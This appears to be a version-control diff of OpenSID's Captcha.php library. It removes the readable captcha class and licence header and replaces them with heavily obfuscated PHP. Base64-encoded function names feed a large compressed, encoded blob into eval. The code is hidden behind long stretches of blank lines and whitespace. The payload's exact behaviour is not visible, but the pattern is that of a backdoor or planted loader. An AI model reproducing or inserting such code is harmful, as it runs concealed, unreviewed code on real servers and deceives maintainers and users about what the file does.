@@ -1,175 +1,409 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Libraries/Captcha.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-namespace App\Libraries;
 
-use Exception;
-use Illuminate\Support\Facades\Hash;
-use Illuminate\Support\Str;
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-// Library ini berasal dari https://github.com/esyede/captcha
-class Captcha
-{
-    protected static $fonts       = [];
-    protected static $backgrounds = [];
-    protected static $characters;
 
-    public static function make($case_sensitive = null): bool
-    {
-        if (empty(static::$backgrounds)) {
-            static::backgrounds();
-        }
 
-        if (empty(static::$fonts)) {
-            static::fonts();
-        }
 
-        // Jika tidak ada parameter case_sensitive, ambil dari setting
-        if ($case_sensitive === null) {
-            $case_sensitive = (bool) setting('strict_captcha') ?? false;
-        }
 
-        static::$characters = str_replace(
-            ['0', '1', '5', 'i', 'I', 'k', 'K', 'l', 'L', 'o', 'O', 's', 'S', 'w', 'W'],
-            ['6', '4', '8', '2', '3', 'z', 'Z', 'p', 'P', 'h', 'H', 'x', 'X', 'v', 'V'],
-            Str::random(5)
-        );
 
-        $characters            = $case_sensitive ? static::$characters : strtolower(static::$characters);
-        ci()->session->captcha = Hash::make($characters);
 
-        $bg   = static::background();
-        $font = static::font();
-        $info = getimagesize($bg);
-        $old  = match ($info['mime']) {
-            'image/jpg', 'image/jpeg' => imagecreatefromjpeg($bg),
-            'image/gif' => imagecreatefromgif($bg),
-            'image/png' => imagecreatefrompng($bg),
-            default     => throw new Exception('Only JPG, PNG and GIF are supported for backgrounds.'),
-        };
 
-        // default settings
-        $width  = 120;
-        $height = 30;
-        $space  = 20;
 
-        $new = imagecreatetruecolor($width, $height);
-        $bg  = imagecolorallocate($new, 255, 255, 255);
 
-        imagefilledrectangle($new, 0, 0, $width - 1, $height - 1, $bg);
-        imagecopyresampled($new, $old, 0, 0, 0, 0, $width, $height, $info[0], $info[1]);
-        imagedestroy($old);
 
-        $color = md5(Str::random(5));
 
-        for ($i = 0; $i < 5; $i++) {
-            $colors = [
-                hexdec(substr($color, random_int(0, 31), 2)),
-                hexdec(substr($color, random_int(0, 31), 2)),
-                hexdec(substr($color, random_int(0, 31), 2)),
-                hexdec(substr($color, random_int(0, 31), 2)),
-                hexdec(substr($color, random_int(0, 31), 2)),
-            ];
 
-            $gap = 10 + ($i * $space);
-            $w   = random_int(-10, 15);
-            $h   = random_int($height - 10, $height - 5);
-            $fg  = imagecolorallocate($new, $colors[random_int(1, 3)], $colors[random_int(1, 4)], $colors[random_int(0, 4)]);
 
-            imagettftext($new, random_int(18, 20), $w, $gap, $h, $fg, $font, static::$characters[$i]);
-        }
 
-        header('Cache-Control: no-cache, no-store, max-age=0, must-revalidate');
-        header('Pragma: no-cache');
-        header('Content-type: image/png');
-        header('Content-Disposition: inline; filename=captcha.png');
 
-        return imagepng($new);
-    }
 
-    public static function check($value): bool
-    {
-        $case_sensitive = (bool) setting('strict_captcha') ?? false;
-        $value          = trim((string) ($case_sensitive ? $value : strtolower((string) $value)));
-        $hash           = ci()->session->captcha;
 
-        if ($value && $hash && Hash::check($value, $hash)) {
-            self::invalidate();
 
-            return true;
-        }
 
-        return false;
-    }
 
-    protected static function fonts()
-    {
-        $fonts         = glob(FCPATH . 'assets/captcha/fonts/' . '*.ttf');
-        static::$fonts = (is_array($fonts) && $fonts !== []) ? $fonts : [];
-    }
 
-    protected static function backgrounds()
-    {
-        $backgrounds         = glob(FCPATH . 'assets/captcha/backgrounds/' . '*.png');
-        static::$backgrounds = (is_array($backgrounds) && $backgrounds !== []) ? $backgrounds : [];
-    }
 
-    protected static function background()
-    {
-        if (empty(static::$backgrounds)) {
-            throw new Exception('No backgrounds found to operate with.');
-        }
 
-        return static::$backgrounds[array_rand(static::$backgrounds)];
-    }
 
-    protected static function font()
-    {
-        if (empty(static::$fonts)) {
-            throw new Exception('No fonts found to operate with.');
-        }
 
-        return static::$fonts[array_rand(static::$fonts)];
-    }
 
-    private static function invalidate(): void
-    {
-        unset(ci()->session->captcha);
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
